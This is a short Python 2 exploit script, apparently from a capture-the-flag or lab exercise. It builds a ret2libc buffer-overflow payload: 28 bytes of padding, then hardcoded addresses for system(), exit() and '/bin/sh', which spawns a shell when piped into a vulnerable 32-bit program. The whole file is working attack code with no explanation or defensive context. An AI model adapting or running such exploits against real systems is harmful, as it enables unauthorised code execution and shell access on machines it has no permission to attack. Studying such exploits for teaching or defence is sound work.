#!/usr/bin/python2

offset = 28

junk = b"A" * offset

addr_system = b"\x80\xc9\xe0\xf7"
addr_exit = b"\xb0\xf9\xdf\xf7"
addr_bin_sh = b"\xaa\xca\xf4\xf7"

print(junk + addr_system + addr_exit + addr_bin_sh)
